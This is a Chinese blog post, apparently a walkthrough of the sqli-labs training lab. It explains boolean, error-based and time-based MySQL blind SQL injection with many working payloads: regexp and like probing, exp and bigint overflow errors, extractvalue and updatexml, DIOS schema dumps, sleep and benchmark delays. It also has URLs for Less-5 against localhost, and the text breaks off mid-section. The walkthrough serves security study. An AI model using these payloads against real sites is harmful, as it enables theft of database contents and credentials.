<h4 id="基于布尔sql盲注——通过构造逻辑判断"><a href="#基于布尔sql盲注——通过构造逻辑判断" class="headerlink" title="基于布尔sql盲注——通过构造逻辑判断"></a>基于布尔sql盲注——通过构造逻辑判断</h4><p>截取字符串的相关函数：参考博文：<a href="https://www.cnblogs.com/lcamry/p/5504374.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/p/5504374.html</a></p>
<p><strong>mid（column_name,start[,length]）函数</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>column_name</td>
<td>必需字段，需要提取字符的字段</td>
</tr>
<tr>
<td>start</td>
<td>必需字段，规定开始截取位置（起始值为1）</td>
</tr>
<tr>
<td>length</td>
<td>12可选字段，要返回的字符数，若省略，则mid（）函数返回剩余文本</td>
</tr>
</tbody></table>
<p>例如:str=“123456”    mid(str,2,1)   输出结果为2</p>
<p>mysql中得应用例子：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.select username,userGender <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">mid</span>(userGender,<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'w'</span>;</span><br><span class="line">//查询user表中userGender列中第一个字母为W得username，userGender列信息</span><br><span class="line">2.select <span class="keyword">mid</span>（‘chinesepeople’,<span class="number">5</span>,<span class="number">3</span>) <span class="keyword">as</span> <span class="keyword">mid</span>;</span><br><span class="line">//查询chinesepeople字符串中第5个开始第7个结束得字符</span><br></pre></td></tr></table></figure>

<p><strong>substr()函数</strong></p>
<p>subsr()和substring()函数的功能一样，均可截断字符串。用法：</p>
<p>string substring(string,start,length)</p>
<p>string substr(string,start,length)</p>
<p>参数与mid()函数是一样的。</p>
<p>应用例子：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">select</span> substr(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"><span class="number">2.</span><span class="keyword">select</span> substr((<span class="keyword">SELECT</span> <span class="built_in">table_name</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">TABLES</span> <span class="keyword">WHERE</span> T table_schema=<span class="number">0</span>xxxxxxx <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>);此处string参数可以为<span class="keyword">sql</span>语句，可自行构造<span class="keyword">sql</span>语句进行注入。</span><br></pre></td></tr></table></figure>

<p><strong>left()函数</strong></p>
<p>left()得到字符串左部指定个数得字符，用法：</p>
<p>left(string，n)    参数string为要截取得字符串，n为长度</p>
<p>应用例子：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">left</span>(<span class="keyword">database</span>(),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p><strong>ascii()函数</strong></p>
<p>该函数主要得用处为将某个字符转换为其ASCII值</p>
<p><strong>ord()函数</strong></p>
<p>该函数用处与ascii()函数一样，都是将某个字符转换为ASCII值</p>
<p><strong>regexp正则注入</strong></p>
<p>在mysql5+种information_schema库中存储了所有的库名，表明以及字段名信息。所以可以通过以下攻击方式进行读取这些信息。</p>
<p>参考博客：<a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
<p>1.判断第一个表名的第一个字符是否是a-z中的字符，其中blind-sqli是假设已知的库名。</p>
<p>注：正则表达式中^[a-z]表示字符串是在a-z范围内</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema="blind_sqli" <span class="keyword">and</span> <span class="built_in">table_name</span> regexp <span class="string">'^[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>2.判断第一个字符是否是a-n中的字符</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema="blind_sqli" <span class="keyword">and</span> <span class="built_in">table_name</span> regexp <span class="string">'^[a-n]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>3.确定该字符n</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">index</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema="blind-sqli" <span class="keyword">and</span> <span class="built_in">table_name</span> regexp <span class="string">'^n'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>4.表达式的更换如下</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expression like <span class="symbol">this:</span> <span class="string">'^n[a-z]'</span>-&gt;<span class="string">'^ne[a-z]'</span>-&gt;<span class="string">'^new[a-z]'</span>-&gt;<span class="string">'^news[a-z]'</span>-&gt;<span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<p>此时说明表名为news，要验证是否该表名正则表达式为‘^news$’ 或者直接判断table_name=’news’</p>
<p>5.猜解其他表名</p>
<p>regexp匹配的时候会在所有的项都进行匹配。例如：</p>
<p>security数据库的表有多个，users,email等，则</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^u[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>); //正确</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>); // 正确</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^em[a-z]'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>); //正确</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^us[a-z]'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>); // 错误</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">and</span> table_name regexp <span class="string">'^em[a-z]'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>); //错误</span><br></pre></td></tr></table></figure>

<p>以上可以说明，在limit 0，1下，regexp会匹配所有的项，我们在使用regexp时，要注意有可能有多个项，同时要一个个字符去爆破。类似于上述第一条和第二条。此时limit 0，1是对于where table_schema=’security’已经起到限定作用，limit有没有不重要。</p>
<p>上面的内容简单的说，正则注入的用法为：select user() regexp ‘^[a-z]’;</p>
<p>也就是正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。第二位可以用select user() regexp ‘^ro’来进行。</p>
<p>测试结果如图</p>
<p><img src="/2019/12/27/sqli-labs-writeup/9.png" alt></p>
<p>当结果显示为1时说明是正确的，显示为0则为不正确</p>
<p><strong>like匹配注入</strong></p>
<p>在mysql中还可以使用like进行匹配</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">like</span> <span class="string">'ro%'</span>;</span><br></pre></td></tr></table></figure>

<p>测试结果如图：</p>
<p><img src="/2019/12/27/sqli-labs-writeup/10.png" alt></p>
<h4 id="基于报错的sql盲注–构造playload让信息通过错误提示回显出来"><a href="#基于报错的sql盲注–构造playload让信息通过错误提示回显出来" class="headerlink" title="基于报错的sql盲注–构造playload让信息通过错误提示回显出来"></a>基于报错的sql盲注–构造playload让信息通过错误提示回显出来</h4><p>方式一：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)<span class="number">*2</span>) a <span class="keyword">from</span> information_schema.columns<span class="built_in"> group </span>by a;</span><br></pre></td></tr></table></figure>

<p>此处有三个关键点：</p>
<ul>
<li><p>需要concat计数</p>
</li>
<li><p>floor，取得0 or 1，进行数据的重复</p>
</li>
<li><p>group by进行分组</p>
</li>
</ul>
<p>其中具体的原理不是很了解，大致的原理为分组后数据计数时重复造成的错误，也有解释为mysql的bug问题，但是此处需要将rand(0)，rand()需要多尝试几次</p>
<p>以上语句可以简化为</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) <span class="keyword">from</span> information_schema.tables<span class="built_in"> group </span>by concat(version(),floor(rand(0)<span class="number">*2</span>))</span><br></pre></td></tr></table></figure>

<p>如果关键表被禁用了，则可简化为</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="literal">null</span> <span class="keyword">union</span> <span class="keyword">select</span> !<span class="number">1</span>) <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">concat</span>(<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))</span><br></pre></td></tr></table></figure>

<p>如果rand被禁用，则使用用户变量进行报错</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">select</span> <span class="selector-tag">min</span>(<span class="variable">@a</span>:=<span class="number">1</span>) <span class="selector-tag">from</span> <span class="selector-tag">information_schema</span><span class="selector-class">.tables</span> <span class="selector-tag">group</span> <span class="selector-tag">by</span> <span class="selector-tag">concat</span>(password,<span class="variable">@a</span>:=(<span class="variable">@a</span>+<span class="number">1</span>)%<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>方式二：</p>
<p><strong>select exp(~(select * from(select user())a))</strong>     //double数值类型超出范围</p>
<p>参考博文：<a href="https://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
<p>mysql版本需要为5.5.5以上</p>
<p>exp()是以e为底的对数函e数，在mysql中expch传递一个大于709的值时，函数就会发生一个溢出错误。当涉及到注入的时候，就可以使用否定查询造成“double value is out of range”的错误，具体方式是通过子查询与按位求反，造成oudouble overflow error，并且借由此注出数据。例如：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(~（<span class="keyword">select</span> * <span class="keyword">from</span> （<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br></pre></td></tr></table></figure>

<p>我在phpstudy上进行测试的时候发现不像参考博客内一样可以直接注出用户名，博客中能注出是这样的</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;`exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x))`</span><br><span class="line"></span><br><span class="line">    mysql&gt; <span class="keyword">select</span> exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())x));</span><br><span class="line">    ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="type">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> range <span class="keyword">in</span> <span class="string">'exp(~((select '</span>root@localhost<span class="string">' from dual)))'</span></span><br></pre></td></tr></table></figure>

<p>并且参考在博客中可以注出表名等数据如下方式：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">得到表名：</span><br><span class="line"><span class="keyword">select</span> exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br><span class="line">得到列名：</span><br><span class="line"><span class="keyword">select</span> exp(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br><span class="line">检索数据：</span><br><span class="line"><span class="keyword">select</span> exp(~ (<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> concat_ws(<span class="string">':'</span>,id, username, <span class="keyword">password</span>) <span class="keyword">from</span> users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x));</span><br></pre></td></tr></table></figure>

<p>目前还在找本地测试为什么不行的原因。后面根据博客<a href="http://www.creatapd.com/%E7%BB%86%E8%B0%88mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/得知在mysql&gt;5.5.53后exp报错不能返回结果。接着调低mysql版本进行测试。" target="_blank" rel="noopener">http://www.creatapd.com/%E7%BB%86%E8%B0%88mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/得知在mysql&gt;5.5.53后exp报错不能返回结果。接着调低mysql版本进行测试。</a></p>
<p><strong>select !(select * from(select user())x) - ~0</strong></p>
<p>利用bigint溢出报错所进行的注入，bigint超出范围，~0是对0逐位取反，需要在5.5.5版本之后才能使用</p>
<p>参考博客:<a href="https://www.cnblogs.com/lcamry/articles/5509112.html" target="_blank" rel="noopener">https://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
<p>其主要的注入方式为利用子查询引起BITINT溢出，从而设法提取数据。在mysql中如果一个查询成功返回，其返回值为0，所以对其进行逻辑非就会变成1</p>
<p>例如，对（select * from (select user())x);进行逻辑非查询</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</span><br><span class="line"><span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</span><br></pre></td></tr></table></figure>

<p><img src="/2019/12/27/sqli-labs-writeup/11.png" alt></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ~<span class="number">0</span>+!(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x);</span><br></pre></td></tr></table></figure>

<p>跟exp报错注入一样，mysql版本需要控制在5.5.5的版本，使用5.5.53版本进行测试会无法得到相应的结果。且在网页浏览器中“+”会被解析转换为空白符，但是可用%2b进行表示“+”，相反也可使用减法进行。同一种的注入方式会有不同的变种。</p>
<p>利用基于bigint溢出错误的注入手法，可以使用mysql所有的数学函数，只要是他们可以进行取反操作。例如：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> !<span class="built_in">atan</span>((<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a))-~<span class="number">0</span>; </span><br><span class="line"><span class="keyword">select</span> !<span class="built_in">ceil</span>((<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())a))-~<span class="number">0</span>;</span><br><span class="line"><span class="keyword">select</span> !<span class="built_in">floor</span>((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))-~<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>比较常用的函数为：</p>
<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HEX</span><br><span class="line">IN</span><br><span class="line"><span class="built_in">FLOOR</span></span><br><span class="line">CEIL</span><br><span class="line"><span class="built_in">RAND</span></span><br><span class="line"><span class="built_in">CEILING</span></span><br><span class="line">TRUNCATE</span><br><span class="line"><span class="built_in">TAN</span></span><br><span class="line"><span class="built_in">SQRT</span></span><br><span class="line"><span class="built_in">ROUND</span></span><br><span class="line"><span class="built_in">SIGN</span></span><br></pre></td></tr></table></figure>

<p>其提取数据的方法与其他注入攻击手法是一致的，例如：</p>
<p>获取表名：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">tables</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x)-~<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>取得列名：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)x)-~<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>检索数据：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!(select * <span class="keyword">from</span> (select concat_ws(<span class="string">':'</span>,id, username, password) <span class="keyword">from</span><span class="built_in"> users </span>limit 0,1)x)-~0;</span><br></pre></td></tr></table></figure>

<p>利用插入语句进行注入：</p>
<p>具体的语法为：‘’ or (payload) or “”</p>
<p>例如：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="keyword">insert</span> <span class="keyword">into</span> users (id, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> <span class="keyword">or</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x)-~<span class="number">0</span> <span class="keyword">or</span> <span class="string">''</span>, <span class="string">'Eyre'</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="type">BIGINT</span> UNSIGNED <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> range <span class="keyword">in</span> <span class="string">'((not((select '</span>root@localhost<span class="string">' from dual))) - ~(0))'</span></span><br></pre></td></tr></table></figure>

<p>使用DIOS查询：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> users (id, username, <span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">2</span>, <span class="string">''</span> <span class="keyword">or</span> !(<span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span>(concat(@:=<span class="number">0</span>,(<span class="keyword">select</span> count(*) <span class="keyword">from</span> `information_schema`.<span class="keyword">columns</span> <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="keyword">and</span>@:=concat(@,<span class="number">0xa</span>,table_schema,<span class="number">0x3a3a</span>,<span class="built_in">table_name</span>,<span class="number">0x3a3a</span>,<span class="built_in">column_name</span>)),@)))x)-~<span class="number">0</span> <span class="keyword">or</span> <span class="string">''</span>, <span class="string">'Eyre'</span>);</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="type">BIGINT</span> UNSIGNED <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> range <span class="keyword">in</span> <span class="string">'((not((select '</span><span class="number">000</span></span><br><span class="line">newdb::users::id</span><br><span class="line">newdb::users::username</span><br><span class="line">newdb::users::<span class="keyword">password</span><span class="string">' from dual))) - ~(0))'</span></span><br></pre></td></tr></table></figure>

<p>利用更新语句进行注入</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; update<span class="built_in"> users </span><span class="builtin-name">set</span> <span class="attribute">password</span>=<span class="string">'Peter'</span> <span class="keyword">or</span> !(select<span class="number">*f</span>rom(select user())x)-~0 <span class="keyword">or</span> <span class="string">''</span> where <span class="attribute">id</span>=4;</span><br><span class="line"><span class="builtin-name">ERROR</span> 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'((not((select '</span>root@localhost<span class="string">' from dual))) - ~(0))'</span></span><br></pre></td></tr></table></figure>

<p>利用删除语句进行注入</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; delete <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">id</span>=<span class="string">'1'</span> <span class="keyword">or</span> !(select<span class="number">*f</span>rom(select user())x)-~0 <span class="keyword">or</span> <span class="string">''</span>;</span><br><span class="line"><span class="builtin-name">ERROR</span> 1690 (22003): BIGINT UNSIGNED value is out of range <span class="keyword">in</span> <span class="string">'((not((select '</span>root@localhost<span class="string">' from dual))) - ~(0))'</span></span><br></pre></td></tr></table></figure>

<p><strong>extractvalue (1,concat(0x7e,(select @@version),0x7e))  se</strong>  </p>
<p>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p>
<p>*<em>updatexml (1,concat(0x7e,(select @@verdion),0x7e),1) *</em></p>
<p>mysql对xml数据进行查询和修改的xpath函数，xpath语法错误</p>
<p><strong>select * from （select NAME_CONST(version(),1),NAME_CONST（version(),1))x;</strong></p>
<p>通过mysql重复的特性，重复使用version函数造成报错。</p>
<h4 id="基于时间的SQL盲注–延时注入"><a href="#基于时间的SQL盲注–延时注入" class="headerlink" title="基于时间的SQL盲注–延时注入"></a>基于时间的SQL盲注–延时注入</h4><p><strong>if （ascii (substr(database(),1,1))&gt;115,0,sleep(5))%23</strong></p>
<p>这是一句if判断语句，若条件为假则执行sleep，在实际渗透的过程中，因时间会有网速等其他影响因素，不可使用以下方法：</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sleep(find_in_set(mid)@@version,<span class="number">1</span>,<span class="number">1</span>), '<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,.';</span><br></pre></td></tr></table></figure>

<p>这句话意思是在0-9之间找版本号的第一位。</p>
<p><strong>union select if(substring(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’ by 5 seconds’ )),null) from (select database() as current) as tb1;</strong></p>
<p>benchmark(current,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时的要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。</p>
<h4 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h4><p>题目界面仍旧</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>

<p>按照前面题目的方法，直接在playload中键入<code>？id=1</code>得到不是相应的id=1的用户信息，得到的是You are in………..。此时查看下源码</p>
<p><img src="/2019/12/27/sqli-labs-writeup/12.png" alt></p>
<p>查询结果存在时显示的不是查询返回的结果，而是直接返回You are in………..</p>
<p>(1)利用left（database(),1)进行尝试</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/?id=1' and left(version(),1)=5 -- +</span></span><br></pre></td></tr></table></figure>

<p>通过上述的playload判断数据库的版本号的第一位是否为5，若返回结果正确时则显示You are in………..，在mysql上进行查询版本号进行验证，发现是5.5.53，当页面没有显示的时候说明版本号是不正确的。</p>
<p>然后再查看数据库的长度</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">5</span><span class="regexp">/?id=1' and length(database())=8 -- +</span></span><br></pre></td></tr></table></figure>

<p>当长度为8时，返回正确的结果，说明长度为8</p>
<p>猜测数据库的第一位</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/sqli-labs-master/Less-5/?id=1' and left(database(),1)&gt;'a' -- +</span></span><br></pre></td></tr></table></figure>

<p>由于我们事先知道Database()为security，所以看起第一位是否&gt;a,因为s&gt;a所以返回是正确的，如果事先不知道的情况下使用二分法进行尝试会提高效率。</p>
<p>猜测数据库第二位，得知第一位为s，看前两位是否会大于sa</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs-master/Less-<span class="number">5</span>/?id=<span class="number">1</span>' <span class="keyword">and</span> left(database(),<span class="number">2</span>)&gt;<span class="symbol">'sa</span>' <span class="comment">-- +</span></span><br></pre></td></tr></table></figure>

<p>往后就是类似的进行猜测，以至于将八位全部猜出来。</p>
<p>(2)利用substr() ascii()函数进行注入</p>
